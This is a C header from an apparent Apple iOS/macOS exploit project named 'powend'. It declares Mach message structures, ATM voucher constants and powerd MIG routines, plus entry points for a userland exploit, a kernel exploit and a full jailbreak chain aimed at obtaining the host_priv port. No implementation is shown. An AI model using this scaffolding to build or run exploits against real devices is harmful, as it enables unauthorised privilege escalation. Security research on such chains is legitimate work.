//
//  code.h
//  powend
//
//  Created by simo on 30/08/2018.
//  Copyright © 2018 simo ghannam. All rights reserved.
//

#ifndef code_h
#define code_h

#include <stdio.h>
#include <mach/mach.h>
#include <mach/mach_traps.h>
#include <mach/mach_voucher.h>
#include <mach/mach_voucher_types.h>
#include <CoreFoundation/CoreFoundation.h>
#define kIOPMServerBootstrapName    "com.apple.PowerManagement.control"

#define ATM_QLIMIT              0//5
#define APP_GROUP               "group.simo.ghannam"
#define FAKE_SERVICE_NAME       APP_GROUP".fake"

#define msgh_request_port   msgh_remote_port
#define msgh_reply_port     msgh_local_port
#define MACH_VOUCHER_ATTR_ATM_NULL         ((mach_voucher_attr_recipe_command_t)501)
#define MACH_VOUCHER_ATTR_ATM_CREATE         ((mach_voucher_attr_recipe_command_t)510)
#define MACH_VOUCHER_ATTR_ATM_REGISTER         ((mach_voucher_attr_recipe_command_t)511)

#define ATM_ACTION_REGISTER     0x6
#define ATM_ACTION_LOGFAIL      0x3

#define CHECK_MACH_ERR(kr,name)   if (kr != KERN_SUCCESS) {\
    printf("%s : %s (0x%x)\n",name,mach_error_string(kr),kr); \
    exit(-1); }

enum {
    kIOPSSourceAll = 0,
    kIOPSSourceInternal,
    kIOPSSourceUPS,
    kIOPSSourceInternalAndUPS,
    kIOPSSourceForAccessories
};

typedef uint32_t atm_action_t;
typedef uint64_t mach_atm_subaid_t;
typedef uint64_t atm_aid_t;

//get host_priv
struct hp_msg {
    mach_msg_header_t hdr;
    mach_msg_body_t body;
    mach_msg_port_descriptor_t port;
};

struct hp_msg_recv {
    mach_msg_header_t hdr;
    mach_msg_body_t body;
    mach_msg_port_descriptor_t port;
    mach_msg_trailer_t trailer;
};

typedef struct {
    mach_msg_header_t hdr;
    mach_msg_body_t body;
    mach_msg_port_descriptor_t memory_buffer[512];
    NDR_record_t NDR;
    atm_aid_t activity_trace_id;
    mach_atm_subaid_t sub_activity_id;
    uint32_t flags;
    mach_msg_type_number_t memory_bufferCnt;
    mach_msg_type_number_t buffer_sizeCnt;
    uint64_t buffer_sizes[512];
    mach_msg_trailer_t tr;
} port_msg_rcv_t;

int do_powend(void);
int do_test(void);
void DumpHex(const void* data, size_t size);
mach_port_t get_service_port(char *);
uint8_t *do_dummy_allocate_p(uint32_t size,char init);
void do_prepare_data(void);

uint64_t do_get_payload_address(uint64_t *,int *);
uint64_t mem_search(uint64_t base, const void* data, size_t size);
void do_leak_payload_address(void);

// our final goal is to get host_priv port
extern mach_port_t host_priv;
extern mach_port_t powerd_task_port;

int check_uexploit_success();
// userland exploit
void start_uexploit(void);
// kernel exploit
int start_kexploit();
//full-chain exploit
void start_jb(void);
int fill_memory_with_user_data(uint64_t target,uint32_t size,uint32_t magic,uint64_t *addr);
extern kern_return_t bootstrap_look_up(mach_port_t bs, const char *service_name, mach_port_t *service);
kern_return_t mach_vm_allocate(vm_map_t target, mach_vm_address_t *address, mach_vm_size_t size, int flags);
mach_port_type_t get_port_type(mach_port_t port);
/* IOKit */
extern CFDataRef IOCFSerialize( CFTypeRef object, CFOptionFlags options );
extern CFTypeRef IOCFUnserialize(const char *buffer, CFAllocatorRef allocator, CFOptionFlags  options,CFStringRef  *errorString);
typedef char name_t[128];

int fileport_makeport(int, mach_port_t*);
int mk_timer_create(void);

/* bootstrap */
extern kern_return_t bootstrap_check_in(mach_port_t bp, const name_t service_name,mach_port_t *sp);

/* MIG calls */
kern_return_t io_ps_new_pspowersource
(
 mach_port_t server,
 int *psid,
 int *return_code
 );
/* Routine io_pm_assertion_copy_details */
kern_return_t io_pm_assertion_copy_details
(
 mach_port_t server,
 int assertion_id,
 int whichData,
 vm_offset_t props,
 mach_msg_type_number_t propsCnt,
 vm_offset_t *assertions,
 mach_msg_type_number_t *assertionsCnt,
 int *return_val
 );

/* Routine io_ps_update_pspowersource */
kern_return_t io_ps_update_pspowersource
(
 mach_port_t server,
 int psid,
 vm_offset_t psdetails,
 mach_msg_type_number_t psdetailsCnt,
 int *return_code
 );

kern_return_t io_ps_copy_powersources_info
(
 mach_port_t server,
 int pstype,
 vm_offset_t *powersources,
 mach_msg_type_number_t *powersourcesCnt,
 int *return_code
 );

/* B:Routine io_pm_connection_copy_status */
kern_return_t io_pm_connection_copy_status
(
 mach_port_t server,
 int status_index,
 vm_offset_t *status_data,
 mach_msg_type_number_t *status_dataCnt,
 int *return_val
 );

/* B:Routine io_pm_hid_event_copy_history */
kern_return_t io_pm_hid_event_copy_history
(
 mach_port_t server,
 vm_offset_t *eventArray,
 mach_msg_type_number_t *eventArrayCnt,
 int *return_val
 );

/* Routine io_ps_release_pspowersource */
kern_return_t io_ps_release_pspowersource
(
 mach_port_t server,
 int psid
 );
/* Routine io_pm_last_wake_time */
kern_return_t io_pm_last_wake_time
(
 mach_port_t server,
 vm_offset_t *wakeData,
 mach_msg_type_number_t *wakeDataCnt,
 vm_offset_t *deltaData,
 mach_msg_type_number_t *deltaDataCnt,
 int *return_val
 );

#endif /* code_h */
